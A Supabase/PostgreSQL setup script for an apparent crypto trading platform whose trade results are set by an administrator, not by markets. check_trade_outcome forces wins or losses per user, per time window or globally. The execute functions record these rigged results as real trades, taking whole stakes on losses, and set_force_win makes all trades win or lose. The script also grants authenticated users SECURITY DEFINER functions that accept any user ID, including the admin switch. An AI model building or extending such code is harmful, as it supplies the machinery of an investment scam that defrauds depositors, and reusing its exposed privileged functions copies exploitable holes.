-- Complete Supabase Trading Backend Setup
-- This creates all necessary functions and endpoints for options trading with admin control

-- 1. Create trading control function (already exists, but let's ensure it's correct)
CREATE OR REPLACE FUNCTION public.check_trade_outcome(
  p_user_id UUID,
  p_trade_type TEXT
) RETURNS BOOLEAN AS $$
DECLARE
  v_outcome BOOLEAN;
  v_user_outcome RECORD;
  v_window RECORD;
  v_settings RECORD;
  v_default_outcome TEXT;
BEGIN
  -- Check if there's an active time window for this user
  SELECT * INTO v_window FROM public.trade_windows
  WHERE user_id = p_user_id
    AND active = true
    AND NOW() BETWEEN start_time AND end_time
  LIMIT 1;
  
  IF FOUND THEN
    -- Check if this trade type is enabled in the window
    IF (p_trade_type = 'spot' AND v_window.spot_enabled) OR
       (p_trade_type = 'futures' AND v_window.futures_enabled) OR
       (p_trade_type = 'options' AND v_window.options_enabled) OR
       (p_trade_type = 'arbitrage' AND v_window.arbitrage_enabled) THEN
      RETURN v_window.outcome_type = 'win';
    END IF;
  END IF;
  
  -- Check if user has a permanent outcome setting
  SELECT * INTO v_user_outcome FROM public.trade_outcomes
  WHERE user_id = p_user_id AND enabled = true;
  
  IF FOUND THEN
    -- Check if this trade type is enabled
    IF (p_trade_type = 'spot' AND v_user_outcome.spot_enabled) OR
       (p_trade_type = 'futures' AND v_user_outcome.futures_enabled) OR
       (p_trade_type = 'options' AND v_user_outcome.options_enabled) OR
       (p_trade_type = 'arbitrage' AND v_user_outcome.arbitrage_enabled) THEN
      RETURN v_user_outcome.outcome_type = 'win';
    END IF;
  END IF;
  
  -- Get system default settings
  SELECT * INTO v_settings FROM public.trading_settings LIMIT 1;
  
  -- Determine default outcome based on trade type
  CASE p_trade_type
    WHEN 'spot' THEN v_default_outcome := COALESCE(v_settings.spot_default, v_settings.default_outcome);
    WHEN 'futures' THEN v_default_outcome := COALESCE(v_settings.futures_default, v_settings.default_outcome);
    WHEN 'options' THEN v_default_outcome := COALESCE(v_settings.options_default, v_settings.default_outcome);
    WHEN 'arbitrage' THEN v_default_outcome := COALESCE(v_settings.arbitrage_default, v_settings.default_outcome);
    ELSE v_default_outcome := v_settings.default_outcome;
  END CASE;
  
  -- Apply default outcome
  IF v_default_outcome = 'win' THEN
    RETURN TRUE;
  ELSIF v_default_outcome = 'loss' THEN
    RETURN FALSE;
  ELSE -- random
    RETURN random() < (v_settings.win_probability::float / 100);
  END IF;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 2. Create options profit rate function
CREATE OR REPLACE FUNCTION public.get_options_profit_rate(p_time_frame INTEGER)
RETURNS NUMERIC AS $$
DECLARE
  v_profit_rate NUMERIC;
BEGIN
  -- Return profit rate based on time frame
  CASE p_time_frame
    WHEN 60 THEN v_profit_rate := 115;   -- 15% profit
    WHEN 120 THEN v_profit_rate := 118;  -- 18% profit
    WHEN 240 THEN v_profit_rate := 122;  -- 22% profit
    WHEN 360 THEN v_profit_rate := 125;  -- 25% profit
    WHEN 600 THEN v_profit_rate := 130;  -- 30% profit
    ELSE v_profit_rate := 115;           -- Default to 15%
  END CASE;
  
  RETURN v_profit_rate;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 3. Create options trading execution function
CREATE OR REPLACE FUNCTION public.execute_options_trade(
  p_user_id UUID,
  p_pair TEXT,
  p_direction TEXT,
  p_amount NUMERIC,
  p_time_frame INTEGER
) RETURNS JSON AS $$
DECLARE
  v_should_win BOOLEAN;
  v_profit_rate NUMERIC;
  v_payout NUMERIC;
  v_pnl NUMERIC;
  v_transaction_id UUID;
  v_result JSON;
BEGIN
  -- Check if trade should win
  v_should_win := public.check_trade_outcome(p_user_id, 'options');
  
  -- Get profit rate for this time frame
  v_profit_rate := public.get_options_profit_rate(p_time_frame);
  
  -- Calculate payout and PnL
  v_payout := CASE WHEN v_should_win THEN p_amount * (v_profit_rate / 100) ELSE 0 END;
  v_pnl := CASE WHEN v_should_win THEN v_payout - p_amount ELSE -p_amount END;
  
  -- Create transaction record
  INSERT INTO public.transactions (
    user_id,
    type,
    asset,
    amount,
    price,
    total,
    side,
    status,
    pnl,
    metadata,
    created_at
  ) VALUES (
    p_user_id,
    'option',
    p_pair,
    p_amount,
    v_payout,
    p_amount,
    CASE WHEN p_direction = 'up' THEN 'buy' ELSE 'sell' END,
    'completed',
    v_pnl,
    jsonb_build_object(
      'direction', p_direction,
      'timeFrame', p_time_frame,
      'profitRate', v_profit_rate,
      'profitPercentage', v_profit_rate - 100,
      'shouldWin', v_should_win,
      'timestamp', EXTRACT(EPOCH FROM NOW()) * 1000
    ),
    NOW()
  ) RETURNING id INTO v_transaction_id;
  
  -- Build result JSON
  v_result := jsonb_build_object(
    'success', true,
    'trade', jsonb_build_object(
      'id', v_transaction_id,
      'pair', p_pair,
      'direction', p_direction,
      'amount', p_amount,
      'timeFrame', p_time_frame,
      'payout', v_payout,
      'status', 'completed',
      'outcome', CASE WHEN v_should_win THEN 'win' ELSE 'loss' END,
      'pnl', v_pnl,
      'message', CASE WHEN v_should_win 
        THEN 'Option won! +' || (v_profit_rate - 100)::TEXT || '% profit'
        ELSE 'Option lost'
      END,
      'metadata', jsonb_build_object(
        'shouldWin', v_should_win,
        'profitRate', v_profit_rate,
        'profitPercentage', v_profit_rate - 100,
        'timestamp', EXTRACT(EPOCH FROM NOW()) * 1000
      )
    )
  );
  
  RETURN v_result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 4. Create spot trading execution function
CREATE OR REPLACE FUNCTION public.execute_spot_trade(
  p_user_id UUID,
  p_pair TEXT,
  p_side TEXT,
  p_amount NUMERIC,
  p_price NUMERIC,
  p_total NUMERIC
) RETURNS JSON AS $$
DECLARE
  v_should_win BOOLEAN;
  v_pnl NUMERIC;
  v_transaction_id UUID;
  v_result JSON;
BEGIN
  -- Check if trade should win
  v_should_win := public.check_trade_outcome(p_user_id, 'spot');
  
  -- Calculate PnL (5% profit for wins)
  v_pnl := CASE WHEN v_should_win THEN p_total * 0.05 ELSE -p_total END;
  
  -- Create transaction record
  INSERT INTO public.transactions (
    user_id,
    type,
    asset,
    amount,
    price,
    total,
    side,
    status,
    pnl,
    metadata,
    created_at
  ) VALUES (
    p_user_id,
    'spot',
    p_pair,
    p_amount,
    p_price,
    p_total,
    p_side,
    'completed',
    v_pnl,
    jsonb_build_object(
      'shouldWin', v_should_win,
      'timestamp', EXTRACT(EPOCH FROM NOW()) * 1000
    ),
    NOW()
  ) RETURNING id INTO v_transaction_id;
  
  -- Build result JSON
  v_result := jsonb_build_object(
    'success', true,
    'trade', jsonb_build_object(
      'id', v_transaction_id,
      'pair', p_pair,
      'side', p_side,
      'amount', p_amount,
      'price', p_price,
      'total', p_total,
      'status', 'completed',
      'outcome', CASE WHEN v_should_win THEN 'win' ELSE 'loss' END,
      'pnl', v_pnl,
      'message', CASE WHEN v_should_win 
        THEN 'Trade completed successfully'
        ELSE 'Trade resulted in loss'
      END,
      'metadata', jsonb_build_object(
        'shouldWin', v_should_win,
        'timestamp', EXTRACT(EPOCH FROM NOW()) * 1000
      )
    )
  );
  
  RETURN v_result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 5. Create admin control functions
CREATE OR REPLACE FUNCTION public.set_force_win(p_enabled BOOLEAN)
RETURNS JSON AS $$
DECLARE
  v_result JSON;
BEGIN
  -- Update trading settings
  UPDATE public.trading_settings 
  SET 
    default_outcome = CASE WHEN p_enabled THEN 'win' ELSE 'loss' END,
    updated_at = NOW()
  WHERE id = (SELECT id FROM public.trading_settings LIMIT 1);
  
  v_result := jsonb_build_object(
    'success', true,
    'message', CASE WHEN p_enabled THEN 'Force win enabled' ELSE 'Force win disabled' END,
    'forceWin', p_enabled
  );
  
  RETURN v_result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 6. Create get admin settings function
CREATE OR REPLACE FUNCTION public.get_admin_settings()
RETURNS JSON AS $$
DECLARE
  v_settings RECORD;
  v_result JSON;
BEGIN
  SELECT * INTO v_settings FROM public.trading_settings LIMIT 1;
  
  v_result := jsonb_build_object(
    'forceWin', v_settings.default_outcome = 'win',
    'message', CASE WHEN v_settings.default_outcome = 'win' 
      THEN 'All trades will win' 
      ELSE 'All trades will lose' 
    END
  );
  
  RETURN v_result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 7. Grant execute permissions
GRANT EXECUTE ON FUNCTION public.check_trade_outcome(UUID, TEXT) TO authenticated;
GRANT EXECUTE ON FUNCTION public.check_trade_outcome(UUID, TEXT) TO service_role;
GRANT EXECUTE ON FUNCTION public.get_options_profit_rate(INTEGER) TO authenticated;
GRANT EXECUTE ON FUNCTION public.get_options_profit_rate(INTEGER) TO service_role;
GRANT EXECUTE ON FUNCTION public.execute_options_trade(UUID, TEXT, TEXT, NUMERIC, INTEGER) TO authenticated;
GRANT EXECUTE ON FUNCTION public.execute_options_trade(UUID, TEXT, TEXT, NUMERIC, INTEGER) TO service_role;
GRANT EXECUTE ON FUNCTION public.execute_spot_trade(UUID, TEXT, TEXT, NUMERIC, NUMERIC, NUMERIC) TO authenticated;
GRANT EXECUTE ON FUNCTION public.execute_spot_trade(UUID, TEXT, TEXT, NUMERIC, NUMERIC, NUMERIC) TO service_role;
GRANT EXECUTE ON FUNCTION public.set_force_win(BOOLEAN) TO authenticated;
GRANT EXECUTE ON FUNCTION public.set_force_win(BOOLEAN) TO service_role;
GRANT EXECUTE ON FUNCTION public.get_admin_settings() TO authenticated;
GRANT EXECUTE ON FUNCTION public.get_admin_settings() TO service_role;

COMMIT;
